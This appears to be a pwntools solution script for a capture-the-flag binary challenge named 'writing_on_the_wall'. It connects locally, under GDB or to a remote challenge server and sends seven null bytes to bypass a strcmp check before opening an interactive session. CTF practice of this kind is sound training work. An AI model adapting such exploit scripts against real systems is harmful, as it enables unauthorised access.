#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("writing_on_the_wall")

# Defining the GDB script that will be used when running the binary with the GDB parameter
gs = '''
b strcmp
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("94.237.56.26", 36542)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

io.sendlineafter(b">> ", p8(0)*7)

#============================================================

# Interact with the process
io.interactive()